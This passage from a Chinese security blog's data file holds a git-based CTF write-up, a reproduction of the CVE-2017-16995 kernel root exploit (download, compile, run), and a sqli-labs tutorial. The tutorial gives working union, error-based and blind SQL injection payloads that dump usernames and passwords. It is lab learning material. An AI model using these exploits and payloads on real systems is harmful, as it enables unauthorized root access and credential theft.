alt=\"WinMain\"><br>按F5反编译就直接看到flag了<br><img src=\"/img/2018-05-22/f5.png\" srcset=\"/img/static/loading.gif\" alt=\"F5\"></p>\n<h5 id=\"git\"><a href=\"#git\" class=\"headerlink\" title=\"git\"></a>git</h5><p>&emsp;&emsp;下载下来是一个<code>.git</code>文件夹，推测跟git有关，随便打开文件看看看到一些信息<br><img src=\"/img/2018-05-22/git.png\" srcset=\"/img/static/loading.gif\" alt=\"git\"><br>稍微了解git应该知道git有分支，回溯分支应该可以还原flag，查看logs<br><img src=\"/img/2018-05-22/flag.png\" srcset=\"/img/static/loading.gif\" alt=\"flag\"><br>linux下使用下面的命令回溯<br><pre><code class=\"hljs undefined\">git reset --hard f<span class=\"hljs-number\">4</span>d<span class=\"hljs-number\">0</span>f<span class=\"hljs-number\">6</span>ddf<span class=\"hljs-number\">6660</span>f<span class=\"hljs-number\">5</span><span class=\"hljs-keyword\">c</span><span class=\"hljs-number\">9273</span><span class=\"hljs-keyword\">c</span><span class=\"hljs-number\">84</span>f<span class=\"hljs-number\">3</span>de<span class=\"hljs-number\">64840</span>a<span class=\"hljs-number\">407</span>bef<span class=\"hljs-number\">1</span></code></pre></p>\n<p><img src=\"/img/2018-05-22/reset.png\" srcset=\"/img/static/loading.gif\" alt=\"reset\"><br>cat flag.txt<br><img src=\"/img/2018-05-22/cat.png\" srcset=\"/img/static/loading.gif\" alt=\"cat\"><br>更多的writeup参考大佬的吧，小弟能力有限，就只能<del>做出</del>复现这些<br>大佬的博客–&gt;<a href=\"https://delcoding.github.io/#blog\" target=\"_blank\" rel=\"noopener\">这里</a></p>"},{"title":"CVE-2017-16995本地提权复现","index_img":"/img/2018-05-19/index.png","date":"2018-05-18T16:18:13.000Z","_content":"### ubuntu本地提权漏洞复现\n参考资料\n[Ubuntu内核提权:CVE-2017-16995漏洞复现](https://blog.csdn.net/DarkHQ/article/details/79622652)\n[漏洞预警 | Ubuntu存在本地提权漏洞（附EXP及应对措施）](http://www.freebuf.com/news/165608.html)\n[Linux Kernel 4.4.0 (Ubuntu 14.04/16.04 x86-64) - 'AF_PACKET' Race Condition Privilege Escalation](https://www.exploit-db.com/exploits/40871/)\n<!--more-->\n##### 漏洞影响版本\nLinux Kernel Version 4.14-4.4\n仅影响Ubuntu/Debian发行版本\n##### 准备环境\n查看内核版本\n```\nuname -r\n```\n![uname](/img/2018-05-19/uname.png)\n搜索版本 \n```\napt-cache search linux\n```\n![apt-cache](/img/2018-05-19/apt-cache.png)\n下载4.4版本的内核\n```\nsudo apt-get install linux-headers-4.4.0-81-generic linux-image-4.4.0-81-generic\n```\n![sudo](/img/2018-05-19/sudo.png)\n更换内核\n```\nsudo nano /boot/grub/grub.cfg\n```\n![nano](/img/2018-05-19/nano.png)\n替换成下图\n![4.4.0](/img/2018-05-19/4.4.0.png)\nctrl+o保存，ctrl+x退出，重启 \n到此，环境就配置完毕\n##### 验证\n脚本下载\n```\nwget http://cyseclabs.com/pub/upstream44.c\n```\n![wget](/img/2018-05-19/wget.png)\n编译\n```\ngcc -o exp upstream44.c\n```\n![gcc](/img/2018-05-19/gcc.png)\n运行\n```\n./exp\n```\n![root](/img/2018-05-19/root.png)\n可以看到前面的用户名已经从ubuntu变成了root，可以执行任何需要超级权限的命令\n##### 修复建议\n升级Linux Kernel 版本(需重启)\n```bash\necho \"deb http://archive.ubuntu.com/ubuntu/ xenial-proposed restricted main multiverse universe\" > /etc/apt/sources.list && apt update && apt install linux-image-4.4.0-117-generic\n```  \n\n","source":"_posts/2018-05-19-CVE-2017-16995.md","raw":"---\ntitle: CVE-2017-16995本地提权复现\nindex_img: /img/2018-05-19/index.png\ndate: 2018-05-19 00:18:13\ntags: \n- 漏洞\n- CVE\n- 提权\n- ubuntu\n---\n### ubuntu本地提权漏洞复现\n参考资料\n[Ubuntu内核提权:CVE-2017-16995漏洞复现](https://blog.csdn.net/DarkHQ/article/details/79622652)\n[漏洞预警 | Ubuntu存在本地提权漏洞（附EXP及应对措施）](http://www.freebuf.com/news/165608.html)\n[Linux Kernel 4.4.0 (Ubuntu 14.04/16.04 x86-64) - 'AF_PACKET' Race Condition Privilege Escalation](https://www.exploit-db.com/exploits/40871/)\n<!--more-->\n##### 漏洞影响版本\nLinux Kernel Version 4.14-4.4\n仅影响Ubuntu/Debian发行版本\n##### 准备环境\n查看内核版本\n```\nuname -r\n```\n![uname](/img/2018-05-19/uname.png)\n搜索版本 \n```\napt-cache search linux\n```\n![apt-cache](/img/2018-05-19/apt-cache.png)\n下载4.4版本的内核\n```\nsudo apt-get install linux-headers-4.4.0-81-generic linux-image-4.4.0-81-generic\n```\n![sudo](/img/2018-05-19/sudo.png)\n更换内核\n```\nsudo nano /boot/grub/grub.cfg\n```\n![nano](/img/2018-05-19/nano.png)\n替换成下图\n![4.4.0](/img/2018-05-19/4.4.0.png)\nctrl+o保存，ctrl+x退出，重启 \n到此，环境就配置完毕\n##### 验证\n脚本下载\n```\nwget http://cyseclabs.com/pub/upstream44.c\n```\n![wget](/img/2018-05-19/wget.png)\n编译\n```\ngcc -o exp upstream44.c\n```\n![gcc](/img/2018-05-19/gcc.png)\n运行\n```\n./exp\n```\n![root](/img/2018-05-19/root.png)\n可以看到前面的用户名已经从ubuntu变成了root，可以执行任何需要超级权限的命令\n##### 修复建议\n升级Linux Kernel 版本(需重启)\n```bash\necho \"deb http://archive.ubuntu.com/ubuntu/ xenial-proposed restricted main multiverse universe\" > /etc/apt/sources.list && apt update && apt install linux-image-4.4.0-117-generic\n```  \n\n","slug":"CVE-2017-16995","published":1,"mouth":"05","updated":"2020-09-18T03:14:11.343Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckffbhowd0002ez8ktz6ghsj6","content":"<h3 id=\"ubuntu本地提权漏洞复现\"><a href=\"#ubuntu本地提权漏洞复现\" class=\"headerlink\" title=\"ubuntu本地提权漏洞复现\"></a>ubuntu本地提权漏洞复现</h3><p>参考资料<br><a href=\"https://blog.csdn.net/DarkHQ/article/details/79622652\" target=\"_blank\" rel=\"noopener\">Ubuntu内核提权:CVE-2017-16995漏洞复现</a><br><a href=\"http://www.freebuf.com/news/165608.html\" target=\"_blank\" rel=\"noopener\">漏洞预警 | Ubuntu存在本地提权漏洞（附EXP及应对措施）</a><br><a href=\"https://www.exploit-db.com/exploits/40871/\" target=\"_blank\" rel=\"noopener\">Linux Kernel 4.4.0 (Ubuntu 14.04/16.04 x86-64) - ‘AF_PACKET’ Race Condition Privilege Escalation</a><br><a id=\"more\"></a></p>\n<h5 id=\"漏洞影响版本\"><a href=\"#漏洞影响版本\" class=\"headerlink\" title=\"漏洞影响版本\"></a>漏洞影响版本</h5><p>Linux Kernel Version 4.14-4.4<br>仅影响Ubuntu/Debian发行版本</p>\n<h5 id=\"准备环境\"><a href=\"#准备环境\" class=\"headerlink\" title=\"准备环境\"></a>准备环境</h5><p>查看内核版本<br><pre><code class=\"hljs undefined\"><span class=\"hljs-attribute\">uname -r</span></code></pre></p>\n<p><img src=\"/img/2018-05-19/uname.png\" srcset=\"/img/static/loading.gif\" alt=\"uname\"><br>搜索版本<br><pre><code class=\"hljs undefined\">apt-<span class=\"hljs-keyword\">cache</span> <span class=\"hljs-keyword\">search</span> linux</code></pre></p>\n<p><img src=\"/img/2018-05-19/apt-cache.png\" srcset=\"/img/static/loading.gif\" alt=\"apt-cache\"><br>下载4.4版本的内核<br><pre><code class=\"hljs undefined\">sudo apt-get install linux-headers<span class=\"hljs-number\">-4.4</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">-81</span>-generic linux-image<span class=\"hljs-number\">-4.4</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">-81</span>-generic</code></pre></p>\n<p><img src=\"/img/2018-05-19/sudo.png\" srcset=\"/img/static/loading.gif\" alt=\"sudo\"><br>更换内核<br><pre><code class=\"hljs undefined\">sudo nano <span class=\"hljs-regexp\">/boot/g</span>rub<span class=\"hljs-regexp\">/grub.cfg</span></code></pre></p>\n<p><img src=\"/img/2018-05-19/nano.png\" srcset=\"/img/static/loading.gif\" alt=\"nano\"><br>替换成下图<br><img src=\"/img/2018-05-19/4.4.0.png\" srcset=\"/img/static/loading.gif\" alt=\"4.4.0\"><br>ctrl+o保存，ctrl+x退出，重启<br>到此，环境就配置完毕</p>\n<h5 id=\"验证\"><a href=\"#验证\" class=\"headerlink\" title=\"验证\"></a>验证</h5><p>脚本下载<br><pre><code class=\"hljs undefined\">wget http:<span class=\"hljs-regexp\">//</span>cyseclabs.com<span class=\"hljs-regexp\">/pub/u</span>pstream44.c</code></pre></p>\n<p><img src=\"/img/2018-05-19/wget.png\" srcset=\"/img/static/loading.gif\" alt=\"wget\"><br>编译<br><pre><code class=\"hljs undefined\">gcc -o <span class=\"hljs-built_in\">exp</span> upstream44.c</code></pre></p>\n<p><img src=\"/img/2018-05-19/gcc.png\" srcset=\"/img/static/loading.gif\" alt=\"gcc\"><br>运行<br><pre><code class=\"hljs undefined\">./<span class=\"hljs-built_in\">exp</span></code></pre></p>\n<p><img src=\"/img/2018-05-19/root.png\" srcset=\"/img/static/loading.gif\" alt=\"root\"><br>可以看到前面的用户名已经从ubuntu变成了root，可以执行任何需要超级权限的命令</p>\n<h5 id=\"修复建议\"><a href=\"#修复建议\" class=\"headerlink\" title=\"修复建议\"></a>修复建议</h5><p>升级Linux Kernel 版本(需重启)</p>\n<pre><code class=\"bash\"><span class=\"built_in\">echo</span> <span class=\"string\">\"deb http://archive.ubuntu.com/ubuntu/ xenial-proposed restricted main multiverse universe\"</span> &gt; /etc/apt/sources.list &amp;&amp; apt update &amp;&amp; apt install linux-image-4.4.0-117-generic\n</code></pre>\n","site":{"data":{"fluid_config":{"favicon":"/img/static/favicon.ico","apple_touch_icon":"/img/static/favicon.ico","title_join_string":" - ","force_https":false,"code":{"copy_btn":true,"highlight":{"enable":true,"lib":"highlightjs","highlightjs":{"style":"Github Gist","bg_color":false},"prismjs":{"style":"default","preprocess":true}}},"fun_features":{"typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"mouse_click":{"enable":false,"style":"values"}},"dark_mode":{"enable":true,"default":"auto"},"color":{"body_bg_color":"#eee","body_bg_color_dark":"#181c27","navbar_bg_color":"#2f4154","navbar_bg_color_dark":"#1f3144","navbar_text_color":"#fff","navbar_text_color_dark":"#d0d0d0","text_color":"#3c4858","text_color_dark":"#c4c6c9","sec_text_color":"#718096","sec_text_color_dark":"#a7a9ad","post_text_color":"#2c3e50","post_text_color_dark":"#c4c6c9","post_heading_color":"#1a202c","post_heading_color_dark":"#c4c6c9","post_link_color":"#0366d6","post_link_color_dark":"#1589e9","link_hover_color":"#30a9de","link_hover_color_dark":"#30a9de","link_hover_bg_color":"#f8f9fa","link_hover_bg_color_dark":"#364151","board_color":"#fff","board_color_dark":"#252d38"},"font":{"font_size":"16px","font_family":null,"code_font_size":"85%"},"custom_js":null,"custom_css":null,"custom_html":"","web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"3vyTx5QfwzFij2bEnjvRIcxV-gzGzoHsz","app_key":"neatHwvRMvcDYnNxMBbGGFlP","server_url":"https://3vytx5qf.lc-cn-n1-shared.com"}},"lazyload":{"enable":true,"onlypost":false},"daovoice":{"enable":false,"appid":""},"aplayer":{"enable":false,"autoplay":false,"loop":"all","order":"random","theme":"#b7daff","songs":[{"name":"name","artist":"artist","url":"/songs/test.mp3","cover":"/img/cover.jpg"},{"name":"name","artist":"artist","url":"https://...url.mp3","cover":"https://...cover.jpg"}]},"version":{"check":false},"navbar":{"blog_title":"Lzywi'Blog","ground_glass":{"enable":false,"px":3,"alpha":0.7},"menu":[{"key":"home","link":"/","icon":"iconfont icon-home-fill"},{"key":"archive","link":"/archives/","icon":"iconfont icon-archive-fill"},{"key":"tag","link":"/tags/","icon":"iconfont icon-tags-fill"},{"key":"links","link":"/links/","icon":"iconfont icon-link-fill"},{"key":"about","link":"/about/","icon":"iconfont icon-user-fill"}]},"search":{"enable":true,"path":"/local-search.xml","generate_path":"/local-search.xml","field":"post","content":true},"scroll_down_arrow":{"enable":true,"banner_height_limit":90,"scroll_after_turning_page":true},"banner_parallax":true,"footer":{"statistics":{"enable":true,"source":"leancloud","pv_format":"总访问量 {} 次","uv_format":"总访客数 {} 人"},"allwordcount":{"enable":true,"format":"全站共计:{} 字"},"beian":{"enable":false,"icp_text":"京ICP证123456号","police_text":"京公网安备12345678号","police_code":12345678,"police_icon":"/img/static/police_beian.png"}},"scroll_top_arrow":{"enable":true},"index":{"banner_img":"/img/static/default2.jpg","banner_img_height":100,"banner_mask_alpha":0.3,"post_default_img":"","slogan":{"enable":true,"text":""},"hitokoto":{"enable":true},"auto_excerpt":{"enable":true},"post_url_target":"_self","post_meta":{"date":true,"category":true,"tag":true}},"page":{"banner_img":"/img/static/default2.jpg","banner_img_height":60,"banner_mask_alpha":0.3},"post":{"banner_img":"/img/static/default.jpg","banner_img_height":70,"banner_mask_alpha":0.3,"meta":{"author":{"enable":false},"date":{"enable":true,"format":"LL a"},"wordcount":{"enable":true,"format":"字数统计:{} 字"},"min2read":{"enable":true,"format":"阅读时长:{} 分钟","words":100},"views":{"enable":false,"source":"leancloud","format":"{} 次"}},"updated":{"enable":false,"content":"本文最后更新于：","relative":false},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"copyright":{"enable":true,"content":"本博客所有文章除特别声明外，均采用 <a href=\"https://creativecommons.org/licenses/by-sa/4.0/deed.zh\" rel=\"nofollow noopener\">CC BY-SA 4.0 协议</a> ，转载请注明出处！"},"prev_next":{"enable":true},"custom":{"enable":false,"content":"<img src=\"https://octodex.github.com/images/jetpacktocat.png\" class=\"rounded mx-auto d-block mt-5\" style=\"width:150px; height:150px;\">"},"image_zoom":{"enable":true},"footnote":{"enable":true,"header":""},"math":{"enable":false,"specific":false,"engine":"mathjax"},"mermaid":{"enable":false,"specific":false,"options":{"theme":"default"}},"comments":{"enable":true,"type":"valine"}},"utterances":{"repo":null,"issue_term":"pathname","label":"utterances","theme":"github-light","theme_dark":"github-dark","crossorigin":"anonymous"},"disqus":{"shortname":null,"disqusjs":false,"apikey":null},"gitalk":{"clientID":null,"clientSecret":null,"repo":null,"owner":null,"admin":["name"],"id":"location.pathname","language":"zh-CN","labels":["Gitalk"],"perPage":10,"pagerDirection":"last","distractionFreeMode":false,"createIssueManually":true},"valine":{"appid":"6PEfc93t6icHph8NMpSh0OFO-gzGzoHsz","appkey":"i3vUWkHRRkiiS7LuUpuIm1E5","placeholder":"说些什么","path":"window.location.pathname","avatar":"retro","meta":["nick","mail","link"],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"sRx9dQVqzL65gdhuYexJtTPF"},"changyan":{"appid":"","appkey":""},"livere":{"uid":""},"remark42":{"host":"https://remark.haoyizebo.com","site_id":"haoyizebo","max_shown_comments":10,"locale":"zh"},"archive":{"banner_img":"/img/static/default1.png","banner_img_height":60,"banner_mask_alpha":0.3,"subtitle":"归 档"},"tag":{"banner_img":"/img/static/default1.png","banner_img_height":60,"banner_mask_alpha":0.3,"subtitle":"标 签","tagcloud":{"min_font":15,"max_font":30,"unit":"px","start_color":"#BBBBEE","end_color":"#337ab7"}},"about":{"banner_img":"/img/static/default1.png","banner_img_height":50,"banner_mask_alpha":0.3,"subtitle":"About me","avatar":"/img/static/avatar.png","name":"Lzywi","introduce":"Life is short, use Python.","icons":[{"class":"iconfont icon-github-fill","link":"https://github.com","tip":"GitHub"},{"class":"iconfont icon-douban-fill","link":"https://douban.com","tip":"豆瓣"},{"class":"iconfont icon-wechat-fill","qrcode":"/img/static/WeChat.jpg"}]},"page404":{"banner_img":"/img/static/default1.png","banner_img_height":60,"banner_mask_alpha":0.3,"subtitle":"404"},"links":{"banner_img":"/img/static/default1.png","banner_img_height":55,"banner_mask_alpha":0.3,"subtitle":"Link","items":[{"title":" ZoE blog","intro":"Pwn的挖坑填坑之旅","link":"https://zoepla.github.io/#blog","image":"/img/Link/ZoE.jpg"},{"title":"Junay blog","intro":"网络安全爱好者","link":"https://delcoding.github.io","image":"/img/Link/Junay.png"},{"title":"Rhy7hm blog","intro":"恭喜你发现了毫无技术含量的博客","link":"https://rhythmmark.github.io","image":"/img/Link/Rhy7hm.png"},{"title":"Cy9nus blog","intro":"人如果没有梦想，跟咸鱼有什么区别","link":"https://cy9nusg4rd3n.github.io/","image":"/img/Link/Cy9nus.jpg"}]}}}},"excerpt":"<h3 id=\"ubuntu本地提权漏洞复现\"><a href=\"#ubuntu本地提权漏洞复现\" class=\"headerlink\" title=\"ubuntu本地提权漏洞复现\"></a>ubuntu本地提权漏洞复现</h3><p>参考资料<br><a href=\"https://blog.csdn.net/DarkHQ/article/details/79622652\" target=\"_blank\" rel=\"noopener\">Ubuntu内核提权:CVE-2017-16995漏洞复现</a><br><a href=\"http://www.freebuf.com/news/165608.html\" target=\"_blank\" rel=\"noopener\">漏洞预警 | Ubuntu存在本地提权漏洞（附EXP及应对措施）</a><br><a href=\"https://www.exploit-db.com/exploits/40871/\" target=\"_blank\" rel=\"noopener\">Linux Kernel 4.4.0 (Ubuntu 14.04/16.04 x86-64) - ‘AF_PACKET’ Race Condition Privilege Escalation</a><br>","more":"</p>\n<h5 id=\"漏洞影响版本\"><a href=\"#漏洞影响版本\" class=\"headerlink\" title=\"漏洞影响版本\"></a>漏洞影响版本</h5><p>Linux Kernel Version 4.14-4.4<br>仅影响Ubuntu/Debian发行版本</p>\n<h5 id=\"准备环境\"><a href=\"#准备环境\" class=\"headerlink\" title=\"准备环境\"></a>准备环境</h5><p>查看内核版本<br><pre><code class=\"hljs undefined\"><span class=\"hljs-attribute\">uname -r</span></code></pre></p>\n<p><img src=\"/img/2018-05-19/uname.png\" srcset=\"/img/static/loading.gif\" alt=\"uname\"><br>搜索版本<br><pre><code class=\"hljs undefined\">apt-<span class=\"hljs-keyword\">cache</span> <span class=\"hljs-keyword\">search</span> linux</code></pre></p>\n<p><img src=\"/img/2018-05-19/apt-cache.png\" srcset=\"/img/static/loading.gif\" alt=\"apt-cache\"><br>下载4.4版本的内核<br><pre><code class=\"hljs undefined\">sudo apt-get install linux-headers<span class=\"hljs-number\">-4.4</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">-81</span>-generic linux-image<span class=\"hljs-number\">-4.4</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">-81</span>-generic</code></pre></p>\n<p><img src=\"/img/2018-05-19/sudo.png\" srcset=\"/img/static/loading.gif\" alt=\"sudo\"><br>更换内核<br><pre><code class=\"hljs undefined\">sudo nano <span class=\"hljs-regexp\">/boot/g</span>rub<span class=\"hljs-regexp\">/grub.cfg</span></code></pre></p>\n<p><img src=\"/img/2018-05-19/nano.png\" srcset=\"/img/static/loading.gif\" alt=\"nano\"><br>替换成下图<br><img src=\"/img/2018-05-19/4.4.0.png\" srcset=\"/img/static/loading.gif\" alt=\"4.4.0\"><br>ctrl+o保存，ctrl+x退出，重启<br>到此，环境就配置完毕</p>\n<h5 id=\"验证\"><a href=\"#验证\" class=\"headerlink\" title=\"验证\"></a>验证</h5><p>脚本下载<br><pre><code class=\"hljs undefined\">wget http:<span class=\"hljs-regexp\">//</span>cyseclabs.com<span class=\"hljs-regexp\">/pub/u</span>pstream44.c</code></pre></p>\n<p><img src=\"/img/2018-05-19/wget.png\" srcset=\"/img/static/loading.gif\" alt=\"wget\"><br>编译<br><pre><code class=\"hljs undefined\">gcc -o <span class=\"hljs-built_in\">exp</span> upstream44.c</code></pre></p>\n<p><img src=\"/img/2018-05-19/gcc.png\" srcset=\"/img/static/loading.gif\" alt=\"gcc\"><br>运行<br><pre><code class=\"hljs undefined\">./<span class=\"hljs-built_in\">exp</span></code></pre></p>\n<p><img src=\"/img/2018-05-19/root.png\" srcset=\"/img/static/loading.gif\" alt=\"root\"><br>可以看到前面的用户名已经从ubuntu变成了root，可以执行任何需要超级权限的命令</p>\n<h5 id=\"修复建议\"><a href=\"#修复建议\" class=\"headerlink\" title=\"修复建议\"></a>修复建议</h5><p>升级Linux Kernel 版本(需重启)</p>\n<pre><code class=\"bash\"><span class=\"built_in\">echo</span> <span class=\"string\">\"deb http://archive.ubuntu.com/ubuntu/ xenial-proposed restricted main multiverse universe\"</span> &gt; /etc/apt/sources.list &amp;&amp; apt update &amp;&amp; apt install linux-image-4.4.0-117-generic\n</code></pre>"},{"title":"sqli-labs的学习记录一（1-8）","index_img":"/img/2018-07-20/index.jpg","date":"2018-07-20T10:49:52.000Z","_content":"&emsp;&emsp;偶然发现`sqli-labs`这个练习平台（本地），这个平台有很多案例可以提供给同学学习，很适合初学者入门。写篇博客~~装个逼~~记录下学习过程（假装我是大佬）\n<!--more-->\n\n#### 下载安装\n- 首先附上github的下载地址-->[传送门](https://github.com/Audi-1/sqli-labs)\n- 下载`phpstudy`，phpstudy的站点目录是这个`PHPTutorial\\WWW`，把刚刚下载的平台解压放到里面\n- 如果我没记错的话，phpstudy的mysql初始密码是root，在`sql-connections\\db-creds.inc`写上你的mysql数据库密码\n![1](/img/2018-07-20/1.png)\n上述步骤做完后就可以启动phpstudy，然后打开火狐浏览器（记得安装hackbar插件），访问`localhost/sqli-labs-master/`看待下面的页面就算安装好了\n点击`Setup/reset Database for labs`建立数据库\n![2](/img/2018-07-20/2.png)\n\n#### 开始学习\n##### less-1\n第一关是最简单的一关了，直接`id=1'`就报错了\n![3](/img/2018-07-20/3.png)\n再测试`id=1' and '1'='1`\n![4](/img/2018-07-20/4.png)\n返回正常，不难想象我们想数据库递交`id=1`的语句为\n```\nselect * from tables where id = '1'  \n```\n递交`id=1' and '1'='1`的语句为\n```\nselect * from tables where id = '1' and '1'='1'\n```\n接下来测试`id=1' union select database() -- +`，`-- +`是注释符\n![5](/img/2018-07-20/5.png)\n发现报错了，错误上说了，列的数量对不上，修改为`id=1' union select 1,2,database() -- +`,页面返回正常但没有返回我们所希望的数据库名称\n这个是因为index.php中`mysql_fetch_array`函数只调用了一个\n![6](/img/2018-07-20/6.png)\n`mysql_fetch_array`函数的作用是从结果集中取得一行作为关联数组或数字数组或二者兼有，可以在终端下试一下，这里就不演示了，下面是我们提交sql查询语句在终端下的结果\n```\nmysql> select * from users where id = '1' union select 1,2,database();\n+----+----------+----------+\n| id | username | password |\n+----+----------+----------+\n|  1 | Dumb     | Dumb     |\n|  1 | 2        | security |\n+----+----------+----------+\n2 rows in set (0.00 sec)\n```\n上面查询结果可以看到返回了两个结果，但是`mysql_fetch_array`只取一行，也就是说要让查询出来的结果放在第一行，这里就用最简单快捷的一种,把id的1改为-1，-1查询不到，因此结果就是我们想要的\n```\nmysql> select * from users where id = '-1' union select 1,2,database();\n+----+----------+----------+\n| id | username | password |\n+----+----------+----------+\n|  1 | 2        | security |\n+----+----------+----------+\n1 row in set (0.00 sec)\n```\n最终的payload为`id=-1' union select 1,2,database() -- +`\n![7](/img/2018-07-20/7.png)\n由于这篇文章是面向初学者写的，可能会比较啰嗦，mysql数据库初始时有四个数据库，如下\n```\nmysql> show databases;\n+--------------------+\n| Database           |\n+--------------------+\n| information_schema |\n| mysql              |\n| performance_schema |\n| test               |\n+--------------------+\n4 rows in set (0.01 sec)\n```\n其中，`information_schema`这个数据库中存着所有数据库的名字及表单列名，详细的细节这里不列出来有不懂的兴趣的可以去了解一下-->[传送门](https://www.jianshu.com/p/ea15158f39f7)，我们也是要先在这个数据库里找到当前数据库的表单和列名才可以把某个表的数据列出来\n```\nmysql> select table_name from information_schema.tables where table_schema = 'security';\n+------------+\n| table_name |\n+------------+\n| emails     |\n| referers   |\n| uagents    |\n| users      |\n+------------+\n4 rows in set (0.00 sec)\n```\n这里可以偷个懒，我们可以不找数据库名直接让`table_schema=database()`就可以省了一步\n```\nmysql> select table_name from information_schema.tables where table_schema = database();\n+------------+\n| table_name |\n+------------+\n| emails     |\n| referers   |\n| uagents    |\n| users      |\n+------------+\n4 rows in set (0.00 sec)\n```\n所以我们的payload为\n```\nid=-1' union select 1,2,table_name from information_schema.tables where table_schema = 'security' -- +\n```\n![8](/img/2018-07-20/8.png)\n但是这样我们只能得到一个表，下面要用到一个函数`group__concat`，下面演示一下效果\n```\nmysql> select group_concat(table_name) from information_schema.tables where table_schema = 'security';\n+-------------------------------+\n| group_concat(table_name)      |\n+-------------------------------+\n| emails,referers,uagents,users |\n+-------------------------------+\n1 row in set (0.00 sec)\n```\n`group_concat`的作用就是把多个查询结果并到一起，于是payload修改为\n```\nid=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema = 'security' -- +\n```\n![9](/img/2018-07-20/9.png)\n用户账号密码应该在users表里头了,我们要查的表就是`users`表了，简单修改一下payload，把`table_name`换成`column_name`，把`information_schema.tables`换成`information_schema.columns`，再把`table_schema`换成`table_name`，payload为\n```\nid=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name = 'users' -- +\n```\n![10](/img/2018-07-20/10.png)\n列也知道了，我们就直接枚举username和password，payload为\n```\nid=-1' union select 1,group_concat(username),group_concat(password) from users -- +\n```\n![11](/img/2018-07-20/11.png)\n第一关就算是过了\n##### less-2\n第二关和第一关如出一辙，只不过id后面的内容没有引号引起来，php代码对比如下\n```\nSELECT * FROM users WHERE id='$id' LIMIT 0,1\n#第一关\nSELECT * FROM users WHERE id=$id LIMIT 0,1\n第二关\n```\n所以我们把paylaod的`id-1`后面的单引号去掉就好了甚至注释符都不用\npayload如下\n```\nid=-1 union select 1,2,database()\nid=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema = 'security'\nid=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name = 'users'\nid=-1 union select 1,group_concat(username),group_concat(password) from users\n```\n第二关完\n##### less-3\n第三关\n```\nSELECT * FROM users WHERE id=('$id') LIMIT 0,1\n```\n多了括号，直接上payload吧\n```\nid=-1') union select 1,2,database() -- +\n```\n就不多列了\n##### less-4\n第四关\n这次有点不同，当我们测试`id=1'`时返回页面是正常的，测试`id=1\"`报错\n![12](/img/2018-07-20/12.png)\n根据报错信息来看，查询语句大概如下\n```\nSELECT * FROM users WHERE id=(\"$id\") LIMIT 0,1\n```\n看一眼index.php，差不多\n![13](/img/2018-07-20/13.png)\n还是那个payload，换汤不换药\n```\nid=-1\") union select 1,2,database() -- +\n```\n##### less-5\n第五关开始提高难度\n首先从大纲里看到第五关是双注入（double injection）,单引号（single quote）\n![14](/img/2018-07-20/14.png)\n这个注入我也好久才理解，就不做了，直接分析\n![15](/img/2018-07-20/15.png)\n首先，sql查询正确会返回`You are in...........`，错误会返回sql的错误，也就是说我们输入正确的查询语句不会返回结果，所以我们要提交错误的查询语句，或者说会报错的语句比较合适，先介绍一些函数`count()`，`rand()`,`floor()`,`concat_ws`\n```\ncount()         计算总数\nrand()    \t \t生成0~1的随机数\nfloor()    \t\t向下取整\nconcat_ws() \t拼接查询结果\n```\n最后一个可能不好理解，用例子说明下\n```\nmysql> select concat_ws(':',username,password) from users;\n+----------------------------------+\n| concat_ws(':',username,password) |\n+----------------------------------+\n| Dumb:Dumb                        |\n| admin:admin                      |\n| admin1:admin1                    |\n| admin2:admin2                    |\n| admin3:admin3                    |\n| dhakkan:dumbo                    |\n| admin4:admin4                    |\n+----------------------------------+\n7 rows in set (0.00 sec)\n```\n1\nrand()*2生成0~2的随机数，floor(rand()*2)产生0或1\n2\n以`select database()`为例子\n```\nselect database()\nconcat_ws(':',select database(),floor(rand()*2))\nselect conut(*),concat_ws(':',(select database()),floor(rand()*2)) as a from information_schema.tables group by a\n```\n![16](/img/2018-07-20/16.png)\n数据库名`security`已经出来了\n关于原因\n<b>`concat_ws(':',select database(),floor(rand()*2))`会产生一大堆`security:0`，`security:1`的查询结果，重点在`group by`，在排序时，排序的结果在临时表里，在插入前会先计算一遍要插入结果的内容，假如是`security:0`，如果此时临时表只有`security:1`的行不存在`security:0`的行，那么数据库要将该条记录插入临时表，由于后面的0和1是随机数，在插入时又要计算一次，那么此时的结果可能已经不再是`security:0`而变成了`security:1`了，就会导致插入时冲突而报错。即检测时和插入时两次计算了随机数的值。</b>\n后面的基本差不多，就不列了，有人可能把这道题当做盲注来做~~一开始我也是这么想的~~\n##### less-6\n<b>双引号的双注入</b>>，把less-5的单引号变成双引号，换汤不换药\n##### less-7\n<b>导入文件注入</b>，这个需要知道网站在系统中的具体位置，（网站管理员怎么可能给你知道。。）也比较难，网上也有写的狠详细的过程-->[传送门](https://www.cnblogs.com/lcamry/p/5763105.html),就直接下一关吧\n##### less-8\nBlind Boolian Based（布尔盲注），这里又涉及到一个盲注的概念，上面的可以直接返回结果是直接注入拿到数据库表单及列等数据，盲注就是，查询结果正确页面返回正常，查询错误页面返回错误，不会带出数据\n举很简单的例子,`1=1`正确\n![17](/img/2018-07-20/17.png)\n`1=2`错误\n![18](/img/2018-07-20/18.png)\n然后注入方法就是不断的查询，通常盲注都要写脚本，先介绍一些函数，`ascii()`,这个函数式把字母变成ascii码值，`substr()`这个函数式切割字符串，假设`a=test`,`substr(a,1,1)=t`,`substr(a,2,1)=e`,以此类推，查数据库payload\n```\nid=1' and ascii(substr(database(),1,1)) >= 